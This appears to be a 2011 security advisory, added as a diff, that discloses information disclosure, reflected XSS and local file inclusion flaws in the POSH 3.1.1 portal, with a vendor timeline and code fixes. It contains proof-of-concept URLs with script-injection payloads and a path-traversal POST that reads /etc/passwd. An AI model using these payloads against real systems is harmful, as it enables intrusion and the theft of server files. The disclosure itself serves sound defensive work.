@@ -1,0 +1,101 @@
+# Exploit Title: POSH <= 3.1.1 Multiple Vulnerabilities
+# Date: 10/10/2011
+# Author: CrashFr
+# Software Link: http://sourceforge.net/projects/posh/
+# Version: 3.1.1
+# Tested on: Linux
+#
+
+
+//----- Advisory
+
+Program          : POSH 3.1.1 and prior
+Vendor           : www.portaneo.com
+Homepage         : http://sourceforge.net/projects/posh/
+Discovery        : 2011/09/19
+Author Contacted : 2011/09/20
+Found by         : CrashFr
+This Advisory    : CrashFr
+
+//----- Application description
+
+
+POSH (Portaneo Open Source Homepage) is a personalizable interface (Netvibes, iGoogle) that can be used in a web application or educational / enterprise intranet context. Enterprise version adds social network, notebooks and search feature.
+
+
+//----- Description of vulnerability
+
+
+Local File Inclusion, Cross-Site Scripting (XSS) and Information Disclosure vulnerabilities were identified within POSH version 3.1.1
+
+
+//----- Proof Of Concept
+
+
+--- Information disclosure ---
+- http://localhost/posh/portal/login.php?lang=fr-en
+	- Vulnerability at includes/sessions.inc.php
+		Replace:
+		if (    preg_match( '/^[a-z]{2}$/', $_GET["lang"] ) || preg_match( '/^[a-z]{2}\-[a-z]{2}$/', $_GET["lang"] )) {
+			$_SESSION['lang'] = $_GET["lang"];
+		By:
+		if ((preg_match( '/^[a-z]{2}$/', $_GET["lang"] ) || preg_match( '/^[a-z]{2}\-[a-z]{2}$/', $_GET["lang"] )) && is_file('../l10n/'.$_GET["lang"].'/lang.php')) {
+			$_SESSION['lang'] = $_GET["lang"];
+
+
+--- XSS ---
+- http://localhost/posh/portal/login.php?message=XSS%20Catched%20!%22%29%29;alert%28%22XSS%22%29;//
+	- Vulnerability at: templates/default/login.php line 42
+		Replace: if ($message!='') echo '<font color="#ff0000"><script type="text/javascript">document.write(lg("'.$message.'"));</script></font><br /><br />';
+		By: if ($message!='') echo '<font color="#ff0000"><script type="text/javascript">document.write(lg("'.htmlspecialchars($message).'"));</script></font><br /><br />';
+
+- http://localhost/posh/admin/login.php?extid=ok%22%3E%3Cscript%3Ealert%28%27XSS%27%29;%3C/script%3E
+	- Vulnerability at: templates/default/login_adminsimplified.php line 93
+		Replace: <input type="hidden" name="extid" maxlength="16" value="<?php echo $extid; ?>" class="thinbox" />
+		By: <input type="hidden" name="extid" maxlength="16" value="<?php if(is_int($extid)){ echo $extid; } ?>" class="thinbox" />
+- http://localhost/posh/admin/index.php?extid=1%29;alert%28%27XSS%27
+	- Vulnerability at: templates/default/index_adminsimplified.php line 67 and 70
+		Replace: $p.admin.widgets.loadModExtId(<?php echo $extid; ?>);
+		By: $p.admin.widgets.loadModExtId(<?php if(is_int($extid)){ echo $extid; } ?>);
+		Replace: $p.admin.widgets.refreshIcons(icon,<?php echo $extid; ?>);
+		By: $p.admin.widgets.refreshIcons(icon,<?php if(is_int($extid)){ echo $extid; } ?>);
+
+
+--- Local File Inclusion ---
+- http://localhost/posh/portal/scr_changelang.php => POST lang=../../../../../../etc/passwd%00
+	POST http://localhost/posh/portal/scr_changelang.php HTTP/1.1
+	lang=../../../../../../../../../../../../../../../../etc/passwd%00
+	
+	- Call http://localhost/posh/portal/moduleff.php for example to see the result (a lot of page use __LANG to include lang file)
+	- Vulnerability at portal/scr_changelang.php line 67
+		Replace: $_SESSION['lang']=$lang;
+		By: if ((preg_match( '/^[a-z]{2}$/', $_GET["lang"] ) || preg_match( '/^[a-z]{2}\-[a-z]{2}$/', $_GET["lang"] )) && is_file('../l10n/'.$_GET["lang"].'/lang.php')) {
+			$_SESSION['lang']=$lang;
+		    }
+
+
+//----- Solution
+
+Apply patchs
+Upgrade POSH to 3.1.2
+
+
+//----- Vulnerability Timeline
+ 
+2011-09-20 - Reported to vendor
+2011-09-21 - Vendor Reply
+2011-09-25 - Vendor released POSH 3.1.2
+2011-10-10 - Vulnerability Disclosed
+
+
+//----- Credits
+
+
+http://www.sysdream.com
+
+crashfr at sysdream dot com
+
+
+//----- Greetings
+
+HZV (http://www.hackerzvoice.net)
